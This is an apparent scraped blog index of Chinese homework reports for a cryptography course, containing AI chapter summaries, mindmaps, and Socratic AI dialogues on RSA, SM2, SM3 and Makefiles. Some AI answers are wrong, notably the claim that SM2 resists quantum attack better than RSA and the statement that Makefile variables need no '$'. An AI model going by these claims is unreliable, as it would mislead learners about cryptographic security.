在RSA算法中，为了确保加密和解密过程的安全性，在选择大素数时需要注意以下几个因素： 1. **素数的大小**：选择足够大的素数（一般至少2048位），以使得通过分解模数n（即p*q）来获得私钥变得非常困难。 2. **随机性**：大素数应通过高质量的随机数生成器生成，确保其不可预测性，避免攻击者通过预测算法获得密钥。 3. **素数的性质**：在选择素数时，应该避免使用一些已知的弱素数，例如梅森素数、费马素数等，攻击者可能利用这些特性进行攻击。 4. **验证素数的质性**：使用有效的质性测试（如米勒-拉宾测试）来验证所选数字的素性，确保不会选择合成数。 5. **密钥长度**：随着计算能力的提高，应定期更新密钥长度以保持安全性。 通过以上方法，可以有效提升RSA加密算法的安全性。你有什么看法或者补充吗？Human： 针对我RSA知识点，我理解了吗AI： 根据我们的对话来看，你对RSA加密算法的理解非常扎实。你能够清晰地阐述以下几个关键点： 1. **密钥结构**：你知道RSA使用公钥和私钥的结构。 2. **公钥与私钥的作用**：你能准确描述公钥用于加密而私钥用于解密的功能。 3. **安全性基础**：你理解RSA的安全性依赖于大素数分解难题。 4. **密钥生成过程**：你提到了随机选择大素数和公钥的生成。 5. **加密与解密公式**：你能够用公式准确表示RSA的加密与解密过程。 6. **安全性注意事项**：你能够识别在选择大素数时应注意的几个因素。 如果你还有其他方面的疑问或者需要更深入的理解，随时可以问我！你觉得自己在哪些地方还有需要进一步巩固的知识吗？","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:4","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习实践过程遇到的问题与解决方式（AI 驱动，优先使用AI工具解决问题）\rQ:SM2的安全性依靠什么保障 A: SM2的安全性主要依靠以下几个方面的保障： 椭圆曲线离散对数问题（ECDLP）： SM2基于椭圆曲线密码学，核心的安全性依赖于椭圆曲线离散对数问题的难解性。在椭圆曲线中，已知点 ( P ) 和点 ( Q = kP ) 的情况下，求出整数 ( k ) 是计算上极其困难的，即使对于大规模计算资源而言也是如此。这使得破解 SM2 的加密和签名方案变得非常困难。 随机数的质量： SM2 的安全性依赖于生成的随机数的质量。特别是在签名生成过程中，随机数 ( k ) 必须是不可预测的且是高质量的。如果 ( k ) 被泄露或是生成方式存在问题，攻击者可以通过已知的签名推断出私钥，从而破坏整个系统的安全性。因此，使用高质量的真随机数生成器（TRNG）是保障 SM2 安全性的重要一环。 参数选择： SM2 使用的椭圆曲线参数是经过精心设计和选择的。中国国家密码管理局推荐的椭圆曲线参数符合安全标准，能够有效防止已知的攻击方法（如弱曲线攻击、复合数曲线攻击等）。 抗量子计算攻击（目前）： 尽管量子计算机对基于传统离散对数问题的密码算法（如 RSA 和 DH）构成威胁，但对椭圆曲线密码学的攻击仍需要相对更大规模的量子计算资源（如 Shor 算法的应用）。因此，在目前的技术条件下，SM2 被认为比传统公钥算法更具抗量子攻击能力。 安全认证与标准化： SM2 是中国国家密码管理局批准的国家标准（GB/T 32918），并且被广泛应用于国密系统中，其安全性已通过大量的实践验证和评估。同时，SM2 经过了严密的数学分析与安全认证，符合国际密码学的标准和安全需求。 总体而言，SM2 的安全性主要依赖于椭圆曲线离散对数问题的复杂性、随机数的质量、参数的安全性设计，以及其在国家和国际上的标准化与实践应用。 ","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:5","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"作业提交要求\r提交Markdown文件,文档命名“学号姓名《密码系统设计》.md” . 提交Markdown文件转为 PDF,文档命名“学号姓名《密码系统设计》第 X 周.pdf” 提交代码托管链接（可选）：学号姓名 gitee(github) 链接 内容质量高有加分 参考链接： AI工具 ChatGPT Kimi.ai - 帮你看更大的世界 (moonshot.cn) 图书 《Window C/C++加密解密实战》 《Head.First.C》 ","date":"2024-09-29","objectID":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:6","tags":[null],"title":"第四周预习报告","uri":"/posts/homework/%E7%AC%AC%E5%9B%9B%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"[toc] 第三周预习报告\r","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:0:0","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习内容\rHead First C 嗨翻C语言 第4章 《windows C/C++加密解密实战》第4章 重点4.2、4.3、4.5 课程mindmap 报告内容参考第一周 ","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:0","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"AI对学习内容的总结\r要求\r让AI（kimi，元宝等）阅读学习内容并进⾏总结，教材内容可以使⽤微信读书或者云班课电⼦教材 总结\r《windows C/C++加密解密实战》第4章\rPDF 文件中的内容是关于密码学中的杂凑函数（Hash Functions）和 HMAC（Hash-Based Message Authentication Code）的详细介绍。以下是对学习内容的总结： 杂凑函数概述： 杂凑函数是一种将任意长度的输入信息转换为固定长度输出串的函数，通常用于信息安全领域。 杂凑函数具有单向性，即从输出难以逆推出输入，且对输入的微小变化会导致输出的显著变化。 安全的杂凑函数应满足输入任意长、输出固定长、计算简单、抗碰撞等特性。 密码学与杂凑函数： 杂凑函数在密码学中的应用包括消息认证、数字签名、保护密码等。 杂凑函数的发展与密码学的进步紧密相关，如 DES、RSA 等密码算法的发展。 杂凑函数的发展： 杂凑函数最初并非用于密码学，直到 20 世纪 70 年代末才被引入。 杂凑函数的设计包括基于分组密码算法的杂凑函数和直接构造的杂凑函数。 杂凑函数的分类： 不带密钥的杂凑函数：如 MD5、SHA-1、SHA-256，主要用于数据完整性检验。 带密钥的杂凑函数：如 HMAC，结合了密钥，用于提供数据完整性和身份认证。 杂凑函数的碰撞： 碰撞是指不同的输入产生相同的杂凑值，这对于安全性是不利的。 SM3 杂凑算法： SM3 是中国国家密码管理局公布的商用密码杂凑算法标准，具有 512 位的消息分组和 256 位的输出。 SM3 算法采用 Merkle-Damgard 结构，与 SHA-256 有相似之处，但设计更为复杂。 HMAC： HMAC 是一种基于密钥的杂凑函数，用于消息认证，结合了密钥和哈希函数。 HMAC 提供了消息完整性认证和信源身份认证。 SHA 系列杂凑算法： SHA 算法是一系列由 NIST 和 NSA 设计的标准哈希算法，包括 SHA-1、SHA-2、SHA-3。 SHA-1 已不再安全，SHA-2（如 SHA-256、SHA-512）是目前应用广泛且相对安全的算法。 实现： 书中提供了 SM3 和 HMAC-SM3 的算法实现示例，包括手工实现和使用 OpenSSL 库的实现。 还介绍了如何使用 OpenSSL 实现 SHA256、SHA384、SHA512 等算法。 OpenSSL EVP 接口： OpenSSL 提供了 EVP 接口，用于统一处理各种密码学算法，包括哈希算法。 EVP 接口允许开发者通过简单的函数调用来使用不同的哈希算法，而无需关心底层实现细节。 这份 PDF 文件为读者提供了密码学中杂凑函数和 HMAC 的全面介绍，包括理论基础、算法描述、安全性分析以及实际编程实现。 《Head First C》第4章\rPDF 文件中的内容是关于 C 语言编程的一章，主要讨论了如何使用多个源文件构建大型程序，以及 C 语言中数据类型的使用。以下是对文件内容的总结： 使用多个源文件：大型程序如果只使用一个源文件，将难以维护。C 语言允许将源代码分割成小的、可管理的块，然后重新组合成一个大型程序。这涉及到对数据类型细节的更多了解，并介绍了 make 工具。 数据类型：C 语言能够处理多种数据类型，包括字符、整数、浮点数等。每种数据类型在内存中占用不同大小的空间，因此在赋值时需要小心，避免将大的值赋给小的变量类型，这可能会导致数据丢失或溢出。 类型转换：在 C 语言中，可以通过类型转换（casting）来在不同的数据类型之间进行转换。例如，可以将整数转换为浮点数进行精确计算。 头文件：为了在多个源文件之间共享函数和变量，可以使用头文件。头文件包含了函数声明和 extern 关键字声明的全局变量，允许在不同的源文件中访问这些函数和变量。 编译过程：C 程序的编译过程包括预处理、编译、汇编和链接四个阶段。预处理处理包含指令，编译将源代码转换为汇编语言，汇编生成目标代码，链接将所有目标代码合并成一个可执行文件。 make 工具：make 是一个自动化构建工具，它可以跟踪文件的依赖关系，并只重新编译那些自上次构建以来已经更改的文件。这大大提高了构建大型项目时的效率。 实验：文档中还包含了一个实验部分，描述了如何使用 Arduino 和各种传感器构建一个植物监测器。这个项目涉及到物理设备的构建和 C 语言编程，用于监测植物的土壤湿度并通过 LED 和串行端口与用户通信。 整体而言，这一章提供了关于如何在 C 语言中有效地使用多个源文件和数据类型，以及如何通过 make 工具自动化构建过程的实用信息。此外，还介绍了一个实际的编程项目，即构建一个 Arduino 植物监测器，这有助于读者将理论知识应用于实践中。 ","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:1","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"对AI总结的反思\r要求\rAI总结的问题 反思\rAI总结比较精简，适合作为提纲、导图等方式指导学习，更有助于分配自己的学习时间和精力 ","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:2","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习思维导图\r要求\rMermaid 代码与截图(参考Mermaid MindMap语法)或者提交思维导图链接（如果使用线上编辑器，推荐processon,xmind,…） 思维导图\r代码: mindmap root(密码学中的杂凑函数与HMAC) sub章1(杂凑函数概述) sub节1_1(定义) sub节1_2(特性) sub节1_3(安全性要求) sub章2(密码学与杂凑函数) sub节2_1(应用) sub节2_2(发展史) sub章3(杂凑函数的发展) sub节3_1(历史) sub节3_2(设计) sub章4(杂凑函数的分类) sub节4_1(不带密钥的杂凑函数) sub节4_2(带密钥的杂凑函数) sub章5(杂凑函数的碰撞) sub节5_1(碰撞定义) sub节5_2(碰撞的影响) sub章6(SM3杂凑算法) sub节6_1(算法标准) sub节6_2(算法结构) sub节6_3(算法实现) sub章7(HMAC) sub节7_1(定义) sub节7_2(产生背景) sub节7_3(设计目标) sub节7_4(算法描述) sub节7_5(独立实现HMAC-SM3) sub章8(SHA系列杂凑算法) sub节8_1(SHA算法概述) sub节8_2(SHA的发展史) sub节8_3(SHA系列算法核心思想) sub节8_4(单向性) sub节8_5(主要用途) sub节8_6(SHA256算法原理解析) sub节8_7(SHA256算法实现) sub节8_8(SHA384和SHA512算法) sub章9(OpenSSL实现) sub节9_1(OpenSSL实现SM3) sub节9_2(OpenSSL实现SHA256) sub节9_3(OpenSSL实现SHA384和SHA512) sub章10(更通用的基于OpenSSL的哈希运算) sub节10_1(EVP接口) sub节10_2(多更新的哈希运算)mindmap root(C语言编程) sub章(使用多个源文件) 4_1(4.1 源文件分割) 4_1_a(易于维护) 4_1_b(使用 make 工具) 4_2(4.2 数据类型细节) 4_2_a(整数类型) 4_2_b(浮点类型) 4_2_c(类型转换) 4_3(4.3 头文件) 4_3_a(共享函数和变量) 4_3_b(extern 关键字) 4_4(4.4 编译过程) 4_4_a(预处理) 4_4_b(编译) 4_4_c(汇编) 4_4_d(链接) sub章(数据类型) 3_1(3.1 基本数据类型) 3_1_a(字符类型 char) 3_1_b(整型 int) 3_1_c(长整型 long) 3_1_d(短整型 short) 3_1_e(浮点型 float) 3_1_f(双精度型 double) 3_2(3.2 数据类型使用) 3_2_a(内存大小) 3_2_b(类型匹配) 3_2_c(溢出问题) sub章(实验部分) 5_1(5.1 Arduino 植物监测器) 5_1_a(设备构建) 5_1_b(读取传感器) 5_1_c(控制 LED) 5_1_d(串行通信)mindmap\rroot(密码学中的杂凑函数与HMAC)\rsub章1(杂凑函数概述)\rsub节1_1(定义)\rsub节1_2(特性)\rsub节1_3(安全性要求)\rsub章2(密码学与杂凑函数)\rsub节2_1(应用)\rsub节2_2(发展史)\rsub章3(杂凑函数的发展)\rsub节3_1(历史)\rsub节3_2(设计)\rsub章4(杂凑函数的分类)\rsub节4_1(不带密钥的杂凑函数)\rsub节4_2(带密钥的杂凑函数)\rsub章5(杂凑函数的碰撞)\rsub节5_1(碰撞定义)\rsub节5_2(碰撞的影响)\rsub章6(SM3杂凑算法)\rsub节6_1(算法标准)\rsub节6_2(算法结构)\rsub节6_3(算法实现)\rsub章7(HMAC)\rsub节7_1(定义)\rsub节7_2(产生背景)\rsub节7_3(设计目标)\rsub节7_4(算法描述)\rsub节7_5(独立实现HMAC-SM3)\rsub章8(SHA系列杂凑算法)\rsub节8_1(SHA算法概述)\rsub节8_2(SHA的发展史)\rsub节8_3(SHA系列算法核心思想)\rsub节8_4(单向性)\rsub节8_5(主要用途)\rsub节8_6(SHA256算法原理解析)\rsub节8_7(SHA256算法实现)\rsub节8_8(SHA384和SHA512算法)\rsub章9(OpenSSL实现)\rsub节9_1(OpenSSL实现SM3)\rsub节9_2(OpenSSL实现SHA256)\rsub节9_3(OpenSSL实现SHA384和SHA512)\rsub章10(更通用的基于OpenSSL的哈希运算)\rsub节10_1(EVP接口)\rsub节10_2(多更新的哈希运算)\rmindmap\rroot(密码学中的杂凑函数与HMAC)\rsub章1(杂凑函数概述)\rsub节1_1(定义)\rsub节1_2(特性)\rsub节1_3(安全性要求)\rsub章2(密码学与杂凑函数)\rsub节2_1(应用)\rsub节2_2(发展史)\rsub章3(杂凑函数的发展)\rsub节3_1(历史)\rsub节3_2(设计)\rsub章4(杂凑函数的分类)\rsub节4_1(不带密钥的杂凑函数)\rsub节4_2(带密钥的杂凑函数)\rsub章5(杂凑函数的碰撞)\rsub节5_1(碰撞定义)\rsub节5_2(碰撞的影响)\rsub章6(SM3杂凑算法)\rsub节6_1(算法标准)\rsub节6_2(算法结构)\rsub节6_3(算法实现)\rsub章7(HMAC)\rsub节7_1(定义)\rsub节7_2(产生背景)\rsub节7_3(设计目标)\rsub节7_4(算法描述)\rsub节7_5(独立实现HMAC-SM3)\rsub章8(SHA系列杂凑算法)\rsub节8_1(SHA算法概述)\rsub节8_2(SHA的发展史)\rsub节8_3(SHA系列算法核心思想)\rsub节8_4(单向性)\rsub节8_5(主要用途)\rsub节8_6(SHA256算法原理解析)\rsub节8_7(SHA256算法实现)\rsub节8_8(SHA384和SHA512算法)\rsub章9(OpenSSL实现)\rsub节9_1(OpenSSL实现SM3)\rsub节9_2(OpenSSL实现SHA256)\rsub节9_3(OpenSSL实现SHA384和SHA512)\rsub章10(更通用的基于OpenSSL的哈希运算)\rsub节10_1(EVP接口)\rsub节10_2(多更新的哈希运算)mindmap\rroot(C语言编程)\rsub章(使用多个源文件)\r4_1(4.1 源文件分割)\r4_1_a(易于维护)\r4_1_b(使用 make 工具)\r4_2(4.2 数据类型细节)\r4_2_a(整数类型)\r4_2_b(浮点类型)\r4_2_c(类型转换)\r4_3(4.3 头文件)\r4_3_a(共享函数和变量)\r4_3_b(extern 关键字)\r4_4(4.4 编译过程)\r4_4_a(预处理)\r4_4_b(编译)\r4_4_c(汇编)\r4_4_d(链接)\rsub章(数据类型)\r3_1(3.1 基本数据类型)\r3_1_a(字符类型 char)\r3_1_b(整型 int)\r3_1_c(长整型 long)\r3_1_d(短整型 short)\r3_1_e(浮点型 float)\r3_1_f(双精度型 double)\r3_2(3.2 数据类型使用)\r3_2_a(内存大小)\r3_2_b(类型匹配)\r3_2_c(溢出问题)\rsub章(实验部分)\r5_1(5.1 Arduino 植物监测器)\r5_1_a(设备构建)\r5_1_b(读取传感器)\r5_1_c(控制 LED)\r5_1_d(串行通信)\rmindmap\rroot(C语言编程)\rsub章(使用多个源文件)\r4_1(4.1 源文件分割)\r4_1_a(易于维护)\r4_1_b(使用 make 工具)\r4_2(4.2 数据类型细节)\r4_2_a(整数类型)\r4_2_b(浮点类型)\r4_2_c(类型转换)\r4_3(4.3 头文件)\r4_3_a(共享函数和变量)\r4_3_b(extern 关键字)\r4_4(4.4 编译过程)\r4_4_a(预处理)\r4_4_b(编译)\r4_4_c(汇编)\r4_4_d(链接)\rsub章(数据类型)\r3_1(3.1 基本数据类型)\r3_1_a(字符类型 char)\r3_1_b(整型 int)\r3_1_c(长整型 long)\r3_1_d(短整型 short)\r3_1_e(浮点型 float)\r3_1_f(双精度型 double)\r3_2(3.2 数据类型使用)\r3_2_a(内存大小)\r3_2_b(类型匹配)\r3_2_c(溢出问题)\rsub章(实验部分)\r5_1(5.1 Arduino 植物监测器)\r5_1_a(设备构建)\r5_1_b(读取传感器)\r5_1_c(控制 LED)\r5_1_d(串行通信)","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:3","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"基于AI的学习\r要求\r至少找到自己理解不是太好2个概念，让AI对自己进行苏格拉底提问 参考下面提示词或者使用AI Agent 提示词：“我在学习XXX知识点，请你以苏格拉底的方式对我进行提问，一次一个问题”\r1. 核心是要求AI工具：“请你以苏格拉底的方式对我进行提问”\r2. 然后AI工具就会给你提问，如果不知道问题的答案，可以反问AI：“你的理解（回答）是什么？”\r3. 如果你觉得差不多了，可以先问问AI工具：“针对我XXX知识点，我理解了吗？”\r4. AI工具会给出它的判断，如果你也觉得自己想清楚了，可以最后问AI工具：“我的回答结束了，请对我的回答进行评价总结”，让它帮你总结一下。学习内容\rHuman: 我在学习Makefile知识点，请你以苏格拉底的方式对我进行提问，一次一个问题AI: 当然可以，让我们开始吧。\r你知道什么是Makefile吗？Human: makefile是一个自动化编译C/C++源文件的文件，通过make指令编译AI: 很好，你已经掌握了Makefile的基本定义。那么，你能告诉我Makefile中的目标（target）是什么吗？Human: 是源文件AI: 接近了，但还不完全准确。在Makefile中，目标（target）通常指的是要生成的文件，比如可执行文件或对象文件，而不仅仅是源文件。那么，你知道如何指定生成这些目标所需的依赖关系和生成规则吗？Human: 不知道AI: 没关系，我们可以一起探讨。在Makefile中，每个规则都包含三个部分： 1. **目标（Target）**：规则中要生成的文件，也就是目标文件。 2. **依赖（Prerequisites）**：生成目标所需的依赖文件，如果依赖文件发生变化，目标将被重新生成。 3. **命令（Command）**：生成目标时需要执行的命令序列。 例如，一个简单的Makefile规则可能看起来像这样： ```makefile my_program: main.o gcc -o my_program main.o ``` 这里，`my_program` 是目标，它依赖于 `main.o` 这个对象文件，命令是使用 gcc 将 `main.o` 链接成最终的可执行文件 `my_program`。 现在，你能想到一个场景，为什么我们需要在Makefile中指定依赖关系吗？Human: 有多个对象文件时AI: 非常好，多个对象文件是Makefile中常见的场景。当你有一个大型项目，包含许多源文件时，你通常不会想要每次都重新编译所有的源文件。依赖关系允许Makefile智能地决定哪些部分需要被重新编译。\r例如，如果只有一个源文件被修改，那么只有依赖于这个源文件的目标需要被重新构建。这样可以节省时间并提高效率。\r那么，你了解Makefile中的模式规则（pattern rules）吗？它们是如何帮助我们编写更简洁、更通用的Makefile的？Human: 不太了解AI： 没问题，我来解释一下。 **模式规则** 是 Makefile 中一种强大的特性，它允许你编写能够匹配多个目标和依赖文件的规则。这样，你就不必为每个文件单独编写规则，从而大大简化了 Makefile 的编写。 例如，假设你有一个项目，所有的 `.c` 源文件都编译成 `.o` 目标文件。你可以使用模式规则来定义这种编译操作： ```makefile %.o: %.c gcc -c $\u003c -o $@ ``` 这里的 `%` 是一个通配符，它代表任意的字符串。这条规则的含义是： - 任何以 `.o` 结尾的目标文件（`%.o`），都依赖于一个同名的 `.c` 源文件（`%.c`）。 - 规则的命令是使用 `gcc -c` 编译器选项来编译源文件（`$\u003c` 表示第一个依赖，即对应的 `.c` 文件），并将输出的目标文件名赋给 `$@`（表示当前的目标文件）。 这样，无论你有多少个 `.c` 文件，只需要一个规则就可以自动编译它们生成 `.o` 文件。 那么，你了解如何使用变量来简化 Makefile 并使其更具可读性吗？Human： 不太了解AI： 没关系，我来解释一下。 在 Makefile 中使用变量可以帮助你减少重复代码，提高可维护性，并且使得 Makefile 更加清晰。变量可以存储常用的路径、文件名、编译器选项等。 ### 定义变量 你可以这样定义一个变量： ```makefile CC = gcc CFLAGS = -Wall -g ``` 这里，`CC` 是编译器变量，`CFLAGS` 是编译器标志变量。 ### 使用变量 使用变量时，只需在 Makefile 的其他部分引用变量名，不需要加 `$` 符号： ```makefile all: my_program my_program: main.o $(CC) -o my_program main.o main.o: main.c $(CC) $(CFLAGS) -c main.c ``` 在这个例子中，`$(CC)` 会被替换为 `gcc`，`$(CFLAGS)` 会被替换为 `-Wall -g`。 ### 自动变量 Makefile 还提供了自动变量，这些变量有特殊的含义，并且会自动获取规则中的目标和依赖信息。例如： ```makefile $(CC) $(CFLAGS) -c $\u003c -o $@ ``` - `$@` 表示目标文件。 - `$\u003c` 表示第一个依赖文件。 - `$^` 表示所有依赖文件。 ### 例子 假设你有多个源文件和一个头文件，你可以这样编写 Makefile： ```makefile CC = gcc CFLAGS = -Wall -g OBJ = main.o foo.o bar.o HEADER = common.h all: my_program my_program: $(OBJ) $(CC) -o my_program $(OBJ) %.o: %.c $(HEADER) $(CC) $(CFLAGS) -c $\u003c -o $@ clean: rm -f my_program $(OBJ) ``` 在这个例子中： - `OBJ` 变量存储所有的对象文件。 - `HEADER` 变量存储公共头文件。 - 模式规则 `%.o: %.c $(HEADER)` 用于编译所有的 `.c` 文件生成 `.o` 文件。 - `clean` 目标用于删除所有生成的文件。 这样，你就可以通过简单的命令 `make` 来编译整个项目，通过 `make clean` 来清理生成的文件。 希望这能帮助你更好地理解 Makefile 中变量的使用。如果你有任何问题，随时问我。","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:4","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习实践过程遇到的问题与解决方式（AI 驱动，优先使用AI工具解决问题）\rQ:SM3的安全性依靠什么保障 A: SM3是中国国家密码管理局于2010年公布的密码杂凑算法标准，主要用于数字签名和验证、消息认证码的生成与验证以及随机数的生成。SM3算法的安全性主要体现在以下几个方面： 输出长度：SM3算法的输出长度为256比特，相比MD5（128比特）和SHA-1（160比特）算法，其输出长度更长，因此具有更高的安全性。 抗碰撞性：SM3算法在设计时考虑了碰撞攻击的问题，并采用了相应的防护措施。目前，尚未有公开的针对SM3算法的碰撞攻击方法。 雪崩效应：SM3算法具有雪崩效应，即输入数据的微小变化会导致输出结果的巨大差异。这一特性使得攻击者难以通过猜测或穷举的方式来破解SM3算法。 算法结构：SM3算法采用Merkle-Damgard结构，消息分组长度为512位，摘要值长度为256位。算法的执行过程包括消息填充、消息扩展、迭代压缩和输出结果。 国际认可：SM3算法已经被纳入国际标准，如ISO/IEC10118-3:2018，这表明其安全性和效率得到了国际认可。 算法公开：SM3算法的设计是公开的，这使得它可以被广泛审查和评估，增加了公众对其安全性的信任。 国家支持：作为中国国家密码管理局推荐的算法，SM3得到了国家的大力支持和推广，广泛应用于金融、电子政务和安防等领域。 综上所述，SM3算法的安全性得到了多方面的保障，包括其设计原理、结构特性、国际标准的认可以及国家的推广应用。这些因素共同确保了SM3算法在实际应用中的安全性和可靠性。 ","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:5","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"作业提交要求\r提交Markdown文件,文档命名“学号姓名《密码系统设计》.md” . 提交Markdown文件转为 PDF,文档命名“学号姓名《密码系统设计》第 X 周.pdf” 提交代码托管链接（可选）：学号姓名 gitee(github) 链接 内容质量高有加分 参考链接： AI工具 ChatGPT Kimi.ai - 帮你看更大的世界 (moonshot.cn) 图书 《Window C/C++加密解密实战》 《Head.First.C》 ","date":"2024-09-22","objectID":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:6","tags":[null],"title":"第三周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%B8%89%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"[toc] 第二周预习报告\r","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:0:0","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"学习内容\rHead First C 嗨翻C语言 第八章 《windows C/C++加密解密实战》第3，5章 第三章重点3.4，3.4，特别3.4.4 第五章重点5.3.7 课程mindmap 报告内容参考第一周 ","date":"2024-09-15","objectID":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/:1:0","tags":[null],"title":"第二周预习报告","uri":"/posts/homework/%E7%AC%AC%E4%BA%8C%E5%91%A8%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/"},{"categories":["homework"],"content":"AI对学习内容的总结\r要求\r让AI（kimi，元宝等）阅读学习内容并进⾏总结，教材内容可以使⽤微信读书或者云班课电⼦教材 总结\r《windows C/C++加密解密实战》第3，5章\r第3章 对称密码算法\r基本概念：介绍了对称密码算法，即加密和解密使用相同密钥的算法。讨论了对称算法的优点（如速度快、效率高）和缺点（如密钥分发困难）。 对称加解密算法的分类：讲述了流加密和分组加密两种类型，以及它们的特点和应用。 流加密算法：详细分析了流加密的工作原理，特别是RC4算法的设计、特点和实现。 分组加密算法：探讨了分组加密的工作模式，如ECB、CBC、CFB、OFB和CTR模式，并讨论了它们的优缺点。 3.4 分组加密算法 工作模式：介绍了分组加密算法的五种工作模式：ECB、CBC、CFB、OFB和CTR。每种模式都有其特定的使用场景和优缺点。 短块加密：讨论了如何处理最后一个数据块小于分组长度的情况，包括填充技术、密文挪用技术和序列加密。 DES和3DES算法：详细介绍了DES算法的原理、密钥生成、加密和解密过程。同时，讨论了3DES算法作为DES的增强版，通过使用三个密钥来提高安全性。 3.4.4 SM4算法 概述：SM4是中国国家密码管理局发布的分组密码算法，适用于无线局域网的安全领域。 密钥扩展算法：描述了如何从128位的加密密钥生成32个轮密钥。 轮函数：解释了SM4算法中每一轮使用的函数，包括非线性变换和线性变换。 加密算法：详细介绍了SM4的加密过程，包括32次迭代运算和最终的反序变换。 解密算法：说明了SM4的解密过程，与加密过程类似，但轮密钥的使用顺序相反。 第5章 密码学中常见的编码格式\rBase64编码：解释了Base64编码的由来、索引表、转化原理，并提供了使用OpenSSL命令行工具和编程实现Base64编解码的方法。 PEM文件：讨论了PEM文件的概念、结构和生成方法，以及它在证书和密钥存储中的应用。 ASN.1和BER、DER：详细介绍了ASN.1的历史、基本概念、编码规则，以及它们在数据通信和电子商务中的应用。 5.3.7 ASN.1实例 ASN.1编译器ASNIC：介绍了如何使用ASN.1编译器ASNIC生成C语言类型文件，避免重复造轮子。 实战ASN.1编解码：通过一个具体的例子，展示了如何在VC工程中使用ASN.1生成的C语言文件进行编解码操作。 编码过程：讨论了如何将定义好的ASN.1数据结构编码为DER格式，包括整数、对象标识符、字节串等类型的编码规则。 解码过程：解释了如何将DER编码的数据解码回ASN.1定义的数据结构，包括处理不同类型的数据和结构。 实战示例\rRC4算法实现：提供了使用C语言和OpenSSL库实现RC4算法的示例代码。 SM4算法实现：展示了如何实现SM4算法，包括密钥扩展、加密和解密过程。 OpenSSL对称加解密：通过实例代码，演示了如何使用OpenSSL进行对称加密和解密操作。 ASN.1编解码实战：介绍了如何使用ASN.1编译器ASNIC生成C语言类型文件，并进行编解码的实战例子。 《Head First C》\r这份PDF文档是《Head First C》第八章的内容，主要讲述了静态和动态库的创建和使用。以下是本章的关键学习内容总结： 静态与动态库： 静态库（.a 文件）在程序编译时链接，而动态库（如 .so, .dll, .dylib 文件）在程序运行时链接。 静态库适合于不经常更改的代码，而动态库允许在不重新编译程序的情况下更新功能。 创建自己的库： 可以通过编译源代码文件（.c 文件）生成目标文件（.o 